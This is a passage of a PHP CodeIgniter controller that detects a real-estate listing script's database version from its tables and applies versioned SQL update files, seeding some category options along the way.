<?php

class Updater extends MY_Controller
{

	public function __construct ()
	{
		parent::__construct();
        
        error_reporting(E_ERROR | E_WARNING | E_PARSE);
        
        $this->load->library('form_validation');
        $this->lang->load('configurator', 'english');
        $this->form_validation->set_error_delimiters('<p class="alert alert-error">', '</p>');
        $this->load->model('user_m');
        
        $CI =& get_instance();
        $CI->form_languages = array();
        
	}
    
    public function installed()
    {
        $this->load->view('configurator/installed');
    }
    
	public function index( $update_version = NULL )
	{
        $this->data['custom_errors'] = '';
        $this->data['update_to_version'] = '';
        $this->data['update_output'] = '';
        $this->data['update_alert'] = true;
        
        if(config_item('installed') != true)
        {
            $this->data['custom_errors'] .= lang_check('Looks like your script is not installed, please install it first');
        }

        $this->check_writing_permissions();
        
        // Get script version
        $this->load->database();
        
        /* [START] Define db version */
        
        $this->data['script_version_db'] = '< 1.5.1';
        
        $list_tables = $this->db->list_tables();
        if(sw_count($list_tables) == 0)
        {
            $this->data['script_version_db'] = 'Unknown';
        }
        
        if ($this->db->table_exists('update_debug'))
        {
           $this->data['script_version_db'] = '1.5.1';
        } 
        if ($this->db->table_exists('favorites'))
        {
           $this->data['script_version_db'] = '1.5.2';
        } 
        if ($this->db->table_exists('property_lang'))
        {
           $this->data['script_version_db'] = '1.5.3';
        } 
        if ($this->db->table_exists('withdrawal'))
        {
           $this->data['script_version_db'] = '1.5.4';
        } 
        if ($this->db->table_exists('custom_templates'))
        {
           $this->data['script_version_db'] = '1.5.5';
        } 
        if ($this->db->table_exists('conversions'))
        {
           $this->data['script_version_db'] = '1.5.6';
        }
        if ($this->db->table_exists('trates'))
        {
           $this->data['script_version_db'] = '1.5.7';
        }
        if ($this->db->table_exists('reports'))
        {
           $this->data['script_version_db'] = '1.5.8';
        }
        if ($this->db->table_exists('removed_listings'))
        {
           $this->data['script_version_db'] = '1.5.9';
        }
        if ($this->db->table_exists('token_api'))
        {
           $this->data['script_version_db'] = '1.6.0';
        }
        if ($this->db->table_exists('user_attend_listing'))
        {
           $this->data['script_version_db'] = '1.6.1';
        }
        if($this->db->field_exists('to_id', 'enquire'))
        {
            $this->data['script_version_db'] = '1.6.2';
        }
        if ($this->db->table_exists('visits'))
        {
           $this->data['script_version_db'] = '1.6.3';
        }
        if ($this->db->table_exists('widget_options'))
        {
           $this->data['script_version_db'] = '1.6.4';
        }
        if($this->db->table_exists('token_api') && $this->db->field_exists('json', 'token_api'))
        {
            $this->data['script_version_db'] = '1.6.5';
        }
        if($this->db->table_exists('option') && $this->db->field_exists('is_not_translatable', 'option'))
        {
            $this->data['script_version_db'] = '1.6.6';
        }
        if($this->db->field_exists('is_password_locked', 'user'))
        {
            $this->data['script_version_db'] = '1.6.7';
        }
        if ($this->db->table_exists('promocode'))
        {
           $this->data['script_version_db'] = '1.6.8';
        }
        if ($this->db->table_exists('historyads'))
        {
           $this->data['script_version_db'] = '1.6.9';
           $this->data['script_version_db'] = '1.7.0';
        }
        if($this->db->table_exists('user') && $this->db->field_exists('recurring_package_id', 'user'))
        {
            $this->data['script_version_db'] = '1.7.1';
            $this->data['script_version_db'] = '1.7.2';
            $this->data['script_version_db'] = '1.7.3';
            $this->data['script_version_db'] = '1.7.4';
        }
        
        /* [END] Define db version */
        
        /* [START] Run update for specific version */
        if($this->data['script_version_db'] == '1.5.2' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.5.3';
        }
        
        if($this->data['script_version_db'] == '1.5.3' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.5.4';
        }
        
        if($this->data['script_version_db'] == '1.5.4' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.5.5';
        }
        
        if($this->data['script_version_db'] == '1.5.5' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.5.6';
        }
        if($this->data['script_version_db'] == '1.5.6' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.5.7';
        }
        if($this->data['script_version_db'] == '1.5.7' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.5.8';
        }
        if($this->data['script_version_db'] == '1.5.8' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.5.9';
        }
        if($this->data['script_version_db'] == '1.5.9' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.6.0';
        }
        if($this->data['script_version_db'] == '1.6.0' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.6.1';
        }
        if($this->data['script_version_db'] == '1.6.1' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.6.2';
        }
        if($this->data['script_version_db'] == '1.6.2' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.6.3';
        }
        if($this->data['script_version_db'] == '1.6.3' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.6.4';
        }
        if($this->data['script_version_db'] == '1.6.4' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.6.5';
        }
        if($this->data['script_version_db'] == '1.6.5' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.6.6';
        }
        if($this->data['script_version_db'] == '1.6.6' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.6.7';
        }
        if($this->data['script_version_db'] == '1.6.7' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.6.8';
        }
        if($this->data['script_version_db'] == '1.6.8' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.6.9';
        }
        if($this->data['script_version_db'] == '1.7.0' && !is_numeric($update_version))
        {
            $this->data['update_to_version'] = '1.7.1';
        }

        /* [END] Run update for specific version */
        
        /* [START] Run Backup */
        if($update_version == 'backup_sql')
        {
            $this->data['update_output'] = $this->backup_sql();
        }
        
        if($update_version == 'backup_files')
        {
            $this->data['update_output'] = $this->backup_files();
        }
        /* [END] Run Backup */
        
        $function_name ='update_'.$update_version;
        if($update_version != NULL && is_numeric($update_version))
            $this->data['update_output'] = $this->{$function_name}();
        
		// Load the view
		$this->load->view('configurator/update_index', $this->data);
    }

    private function update_171()
    {
        $version = '1.7.1';
        $previous_version = '1.7.0';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }

        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }

    private function update_169()
    {
        $version = '1.6.9';
        $previous_version = '1.6.8';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }

        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }

    private function update_168()
    {
        $version = '1.6.8';
        $previous_version = '1.6.7';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }

        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }

    private function update_167()
    {
        $version = '1.6.7';
        $previous_version = '1.6.6';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
          
        $query = $this->db->get_where('option', array('id' => 79), 1);
        if ($query->num_rows() == 0)
        {
            
            $this->db->query('
                            INSERT INTO `option` (`id`,`parent_id`, `order`, `type`, `visible`, `is_locked`, `is_frontend`, `is_hardlocked`)
                            VALUES (79, 0, 1, "TREE", 1, 1, 1, 0);
                            ');
            $this->db->query('
                            INSERT INTO `option_lang` (`option_id`, `language_id`, `option`, `values`, `prefix`, `suffix`) 
                                            VALUES ( 79,1,"Categories","","",""),
                                               (79,2,"Categories","","","");
                            ');
            
            if($this->db->_error_message() != '')
                $db_error.= '<br />'.$this->db->_error_message();
            
            $this->load->model('language_m');
            $this->load->model('treefield_m');
            $data = array
            (
                'parent_id' => 0,
                'template' => 'treefield_treefield',
                'level'=>0,
                'font_icon_code'=>'fa fa-building',
            );
            $data_lang= array();
            $data_lang['value_1'] = 'Apartment';
            $data_lang['value_2'] = 'Apartment';
            $treefield_id = $this->treefield_m->save_with_lang($data, $data_lang, 79);
            
            
            $data = array
            (
                'parent_id' => 0,
                'template' => 'treefield_treefield',
                'level'=>0,
                'font_icon_code'=>'fa fa-home',
            );
            $data_lang= array();
            $data_lang['value_1'] = 'House';
            $data_lang['value_2'] = 'House';
            $treefield_id = $this->treefield_m->save_with_lang($data, $data_lang, 79);
            
            
            $data = array
            (
                'parent_id' => 0,
                'template' => 'treefield_treefield',
                'level'=>0,
                'font_icon_code'=>'fa fa-usd',
            );
            $data_lang= array();
            $data_lang['value_1'] = 'Commercial';
            $data_lang['value_2'] = 'Commercial';
            $treefield_id = $this->treefield_m->save_with_lang($data, $data_lang, 79);
            
            
            $data = array
            (
                'parent_id' => 0,
                'template' => 'treefield_treefield',
                'level'=>0,
                'font_icon_code'=>'fa fa-cutlery',
            );
            $data_lang= array();
            $data_lang['value_1'] = 'Restaurant';
            $data_lang['value_2'] = 'Restaurant';
            $treefield_id = $this->treefield_m->save_with_lang($data, $data_lang, 79);
            
            $data = array
            (
                'parent_id' => 0,
                'template' => 'treefield_treefield',
                'level'=>0,
                'font_icon_code'=>'fa fa-pagelines',
            );
            $data_lang= array();
            $data_lang['value_1'] = 'Land';
            $data_lang['value_2'] = 'Land';
            $treefield_id = $this->treefield_m->save_with_lang($data, $data_lang, 79);
            
        } 
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }

    private function update_166()
    {
        $version = '1.6.6';
        $previous_version = '1.6.5';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        /* [Additional check for virtual form search */
//        $query = $this->db->get_where('forms_search', array('id' => 3), 1);
//        if ($query->num_rows() == 0)
//        {
//            $this->db->query('INSERT INTO `forms_search` (`id`, `theme`, `form_name`, `type`, `fields_order_primary`, `fields_order_secondary`) VALUES '.
//                             '(3, \'bootstrap2-responsive\', \'Bootstrap-search\', \'MAIN\', \'{  "PRIMARY": {  "C_PURPOSE":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"C_PURPOSE"} ,"TREE_64":{"direction":"NONE", "style":"", "class":"", "id":"64", "type":"TREE"} ,"SMART_SEARCH":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"SMART_SEARCH"} ,"DROPDOWN_2":{"direction":"NONE", "style":"", "class":"", "id":"2", "type":"DROPDOWN"} ,"DROPDOWN_3":{"direction":"NONE", "style":"", "class":"", "id":"3", "type":"DROPDOWN"} }, "SECONDARY": {  "INPUTBOX_19":{"direction":"NONE", "style":"", "class":"", "id":"19", "type":"INPUTBOX"} ,"INPUTBOX_20":{"direction":"NONE", "style":"", "class":"", "id":"20", "type":"INPUTBOX"} ,"INPUTBOX_36_FROM":{"direction":"FROM", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"INPUTBOX_36_TO":{"direction":"TO", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"CHECKBOX_11":{"direction":"NONE", "style":"", "class":"", "id":"11", "type":"CHECKBOX"} ,"CHECKBOX_29":{"direction":"NONE", "style":"", "class":"", "id":"29", "type":"CHECKBOX"} ,"CHECKBOX_22":{"direction":"NONE", "style":"", "class":"", "id":"22", "type":"CHECKBOX"} ,"CHECKBOX_32":{"direction":"NONE", "style":"", "class":"", "id":"32", "type":"CHECKBOX"} ,"CHECKBOX_25":{"direction":"NONE", "style":"", "class":"", "id":"25", "type":"CHECKBOX"} ,"CHECKBOX_30":{"direction":"NONE", "style":"", "class":"", "id":"30", "type":"CHECKBOX"} ,"CHECKBOX_27":{"direction":"NONE", "style":"", "class":"", "id":"27", "type":"CHECKBOX"} ,"CHECKBOX_33":{"direction":"NONE", "style":"", "class":"", "id":"33", "type":"CHECKBOX"} ,"CHECKBOX_28":{"direction":"NONE", "style":"", "class":"", "id":"28", "type":"CHECKBOX"} ,"CHECKBOX_23":{"direction":"NONE", "style":"", "class":"", "id":"23", "type":"CHECKBOX"} } }\', \'0\');');
//            if($this->db->_error_message() != '')
//                $db_error.= '<br />'.$this->db->_error_message();
//        } 

        /* [Additional check for column issue in script] */
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }

    private function update_165()
    {
        $version = '1.6.5';
        $previous_version = '1.6.4';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        /* [Additional check for virtual form search */
//        $query = $this->db->get_where('forms_search', array('id' => 3), 1);
//        if ($query->num_rows() == 0)
//        {
//            $this->db->query('INSERT INTO `forms_search` (`id`, `theme`, `form_name`, `type`, `fields_order_primary`, `fields_order_secondary`) VALUES '.
//                             '(3, \'bootstrap2-responsive\', \'Bootstrap-search\', \'MAIN\', \'{  "PRIMARY": {  "C_PURPOSE":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"C_PURPOSE"} ,"TREE_64":{"direction":"NONE", "style":"", "class":"", "id":"64", "type":"TREE"} ,"SMART_SEARCH":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"SMART_SEARCH"} ,"DROPDOWN_2":{"direction":"NONE", "style":"", "class":"", "id":"2", "type":"DROPDOWN"} ,"DROPDOWN_3":{"direction":"NONE", "style":"", "class":"", "id":"3", "type":"DROPDOWN"} }, "SECONDARY": {  "INPUTBOX_19":{"direction":"NONE", "style":"", "class":"", "id":"19", "type":"INPUTBOX"} ,"INPUTBOX_20":{"direction":"NONE", "style":"", "class":"", "id":"20", "type":"INPUTBOX"} ,"INPUTBOX_36_FROM":{"direction":"FROM", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"INPUTBOX_36_TO":{"direction":"TO", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"CHECKBOX_11":{"direction":"NONE", "style":"", "class":"", "id":"11", "type":"CHECKBOX"} ,"CHECKBOX_29":{"direction":"NONE", "style":"", "class":"", "id":"29", "type":"CHECKBOX"} ,"CHECKBOX_22":{"direction":"NONE", "style":"", "class":"", "id":"22", "type":"CHECKBOX"} ,"CHECKBOX_32":{"direction":"NONE", "style":"", "class":"", "id":"32", "type":"CHECKBOX"} ,"CHECKBOX_25":{"direction":"NONE", "style":"", "class":"", "id":"25", "type":"CHECKBOX"} ,"CHECKBOX_30":{"direction":"NONE", "style":"", "class":"", "id":"30", "type":"CHECKBOX"} ,"CHECKBOX_27":{"direction":"NONE", "style":"", "class":"", "id":"27", "type":"CHECKBOX"} ,"CHECKBOX_33":{"direction":"NONE", "style":"", "class":"", "id":"33", "type":"CHECKBOX"} ,"CHECKBOX_28":{"direction":"NONE", "style":"", "class":"", "id":"28", "type":"CHECKBOX"} ,"CHECKBOX_23":{"direction":"NONE", "style":"", "class":"", "id":"23", "type":"CHECKBOX"} } }\', \'0\');');
//            if($this->db->_error_message() != '')
//                $db_error.= '<br />'.$this->db->_error_message();
//        } 

        /* [Additional check for column issue in script] */
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }

    private function update_164()
    {
        $version = '1.6.4';
        $previous_version = '1.6.3';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        /* [Additional check for virtual form search */
//        $query = $this->db->get_where('forms_search', array('id' => 3), 1);
//        if ($query->num_rows() == 0)
//        {
//            $this->db->query('INSERT INTO `forms_search` (`id`, `theme`, `form_name`, `type`, `fields_order_primary`, `fields_order_secondary`) VALUES '.
//                             '(3, \'bootstrap2-responsive\', \'Bootstrap-search\', \'MAIN\', \'{  "PRIMARY": {  "C_PURPOSE":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"C_PURPOSE"} ,"TREE_64":{"direction":"NONE", "style":"", "class":"", "id":"64", "type":"TREE"} ,"SMART_SEARCH":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"SMART_SEARCH"} ,"DROPDOWN_2":{"direction":"NONE", "style":"", "class":"", "id":"2", "type":"DROPDOWN"} ,"DROPDOWN_3":{"direction":"NONE", "style":"", "class":"", "id":"3", "type":"DROPDOWN"} }, "SECONDARY": {  "INPUTBOX_19":{"direction":"NONE", "style":"", "class":"", "id":"19", "type":"INPUTBOX"} ,"INPUTBOX_20":{"direction":"NONE", "style":"", "class":"", "id":"20", "type":"INPUTBOX"} ,"INPUTBOX_36_FROM":{"direction":"FROM", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"INPUTBOX_36_TO":{"direction":"TO", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"CHECKBOX_11":{"direction":"NONE", "style":"", "class":"", "id":"11", "type":"CHECKBOX"} ,"CHECKBOX_29":{"direction":"NONE", "style":"", "class":"", "id":"29", "type":"CHECKBOX"} ,"CHECKBOX_22":{"direction":"NONE", "style":"", "class":"", "id":"22", "type":"CHECKBOX"} ,"CHECKBOX_32":{"direction":"NONE", "style":"", "class":"", "id":"32", "type":"CHECKBOX"} ,"CHECKBOX_25":{"direction":"NONE", "style":"", "class":"", "id":"25", "type":"CHECKBOX"} ,"CHECKBOX_30":{"direction":"NONE", "style":"", "class":"", "id":"30", "type":"CHECKBOX"} ,"CHECKBOX_27":{"direction":"NONE", "style":"", "class":"", "id":"27", "type":"CHECKBOX"} ,"CHECKBOX_33":{"direction":"NONE", "style":"", "class":"", "id":"33", "type":"CHECKBOX"} ,"CHECKBOX_28":{"direction":"NONE", "style":"", "class":"", "id":"28", "type":"CHECKBOX"} ,"CHECKBOX_23":{"direction":"NONE", "style":"", "class":"", "id":"23", "type":"CHECKBOX"} } }\', \'0\');');
//            if($this->db->_error_message() != '')
//                $db_error.= '<br />'.$this->db->_error_message();
//        } 

        /* [Additional check for column issue in script] */
        
        if (!$this->db->field_exists('id_trans_text', 'property'))
        {
            $this->db->query('ALTER TABLE `property` ADD `id_trans_text` VARCHAR(60) NULL AFTER `id_transitions`;');
            if($this->db->_error_message() != '')
                $db_error.= '<br />'.$this->db->_error_message();
        }

        if (!$this->db->field_exists('listing_id', 'file'))
        {
            $this->db->query('ALTER TABLE `file` ADD `listing_id` INT(11) NULL DEFAULT NULL AFTER `link`;');
            if($this->db->_error_message() != '')
                $db_error.= '<br />'.$this->db->_error_message();
        }

        $fields = $this->db->field_data('token_api');
        foreach ($fields as $field)
        {
                if($field->name == 'id')
                {
                    if($field->primary_key != 1)
                    {
                        $this->db->query('ALTER TABLE `token_api` ADD PRIMARY KEY(`id`);');
                        if($this->db->_error_message() != '')
                            $db_error.= '<br />'.$this->db->_error_message();

                        break;
                    }
                }
        }
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }
    
    private function update_163()
    {
        $version = '1.6.3';
        $previous_version = '1.6.2';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
            return $update_output;
        }
        
        $db_error = '';
        
        /* [Additional check for virtual form search */
//        $query = $this->db->get_where('forms_search', array('id' => 3), 1);
//        if ($query->num_rows() == 0)
//        {
//            $this->db->query('INSERT INTO `forms_search` (`id`, `theme`, `form_name`, `type`, `fields_order_primary`, `fields_order_secondary`) VALUES '.
//                             '(3, \'bootstrap2-responsive\', \'Bootstrap-search\', \'MAIN\', \'{  "PRIMARY": {  "C_PURPOSE":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"C_PURPOSE"} ,"TREE_64":{"direction":"NONE", "style":"", "class":"", "id":"64", "type":"TREE"} ,"SMART_SEARCH":{"direction":"NONE", "style":"", "class":"", "id":"NONE", "type":"SMART_SEARCH"} ,"DROPDOWN_2":{"direction":"NONE", "style":"", "class":"", "id":"2", "type":"DROPDOWN"} ,"DROPDOWN_3":{"direction":"NONE", "style":"", "class":"", "id":"3", "type":"DROPDOWN"} }, "SECONDARY": {  "INPUTBOX_19":{"direction":"NONE", "style":"", "class":"", "id":"19", "type":"INPUTBOX"} ,"INPUTBOX_20":{"direction":"NONE", "style":"", "class":"", "id":"20", "type":"INPUTBOX"} ,"INPUTBOX_36_FROM":{"direction":"FROM", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"INPUTBOX_36_TO":{"direction":"TO", "style":"", "class":"", "id":"36", "type":"INPUTBOX"} ,"CHECKBOX_11":{"direction":"NONE", "style":"", "class":"", "id":"11", "type":"CHECKBOX"} ,"CHECKBOX_29":{"direction":"NONE", "style":"", "class":"", "id":"29", "type":"CHECKBOX"} ,"CHECKBOX_22":{"direction":"NONE", "style":"", "class":"", "id":"22", "type":"CHECKBOX"} ,"CHECKBOX_32":{"direction":"NONE", "style":"", "class":"", "id":"32", "type":"CHECKBOX"} ,"CHECKBOX_25":{"direction":"NONE", "style":"", "class":"", "id":"25", "type":"CHECKBOX"} ,"CHECKBOX_30":{"direction":"NONE", "style":"", "class":"", "id":"30", "type":"CHECKBOX"} ,"CHECKBOX_27":{"direction":"NONE", "style":"", "class":"", "id":"27", "type":"CHECKBOX"} ,"CHECKBOX_33":{"direction":"NONE", "style":"", "class":"", "id":"33", "type":"CHECKBOX"} ,"CHECKBOX_28":{"direction":"NONE", "style":"", "class":"", "id":"28", "type":"CHECKBOX"} ,"CHECKBOX_23":{"direction":"NONE", "style":"", "class":"", "id":"23", "type":"CHECKBOX"} } }\', \'0\');');
//            if($this->db->_error_message() != '')
//                $db_error.= '<br />'.$this->db->_error_message();
//        } 

        /* [Additional check for column issue in script] */
        if (!$this->db->field_exists('listing_id', 'file'))
        {
            $this->db->query('ALTER TABLE `file` ADD `listing_id` INT(11) NULL DEFAULT NULL AFTER `link`;');
            if($this->db->_error_message() != '')
                $db_error.= '<br />'.$this->db->_error_message();
        }
        
        $sql=file_get_contents(FCPATH.'sql_scripts/update-'.$version.'.sql');
        $sql = str_replace('"dont run this file manually!"', '', $sql);

          foreach (explode(";", $sql) as $sql) 
           {
             $sql = trim($sql);
              //echo  $sql.'<br/>============<br/>';
                if($sql) 
              {
                if(empty($db_error))
                {
                    $this->db->query($sql);
                    if($this->db->_error_message() != '')
                        $db_error.= '<br />'.$this->db->_error_message();
                }
                else
                {
                    break;
                }
               } 
          }
        
        if(!empty($db_error))
            $update_output.=$db_error.'<br />';
          
        // Execute db_structure modifications
//        $this->fix_gps($update_output);
//        $this->fix_image_filename($update_output);
//        $this->fix_data_structure($update_output);

        if(empty($update_output))
            $update_output.=lang_check('Completed successfully to db version: ').$version;
        
        return $update_output;
    }

    private function update_162()
    {
        $version = '1.6.2';
        $previous_version = '1.6.1';
        
        $update_output = '';
        
        if($this->data['script_version_db'] != $previous_version)
        {
            $update_output.= lang_check('Wrong script version or already updated!');
            return $update_output;
        }

        // Run copy geo map
        $this->load->model('settings_m');
        $this->settings = $this->settings_m->get_fields();
        if(file_exists(FCPATH.'templates/'.$this->settings['template'].'/files/treefield_64_map.svg') && !file_exists(FCPATH.'files/treefield_64_map.svg'))
        {
            copy(FCPATH.'templates/'.$this->settings['template'].'/files/treefield_64_map.svg', FCPATH.'files/treefield_64_map.svg');
        }
        
        // Run sql import file
        if(!file_exists(FCPATH.'sql_scripts/update-'.$version.'.sql'))
        {
            $update_output.= '<br />Missing file: sql_scripts/update-'.$version.'.sql';
